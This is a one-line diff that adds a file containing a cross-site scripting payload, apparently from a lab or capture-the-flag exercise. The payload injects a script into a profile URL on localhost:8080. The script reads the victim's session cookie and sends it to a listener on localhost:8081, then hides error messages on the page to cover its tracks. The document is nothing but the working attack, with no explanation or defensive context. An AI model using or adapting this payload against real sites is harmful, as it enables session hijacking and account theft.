@@ -1,0 +1,1 @@
+http://localhost:8080/profile/<script>fetch(`http://localhost:8081/xss_out%3Fstolen_cookie=${document.cookie.split("session=")[1].split(";")[0]}`).catch(()=>{document.querySelectorAll('.error').forEach(function(el){el.style.display="none";});})</script>
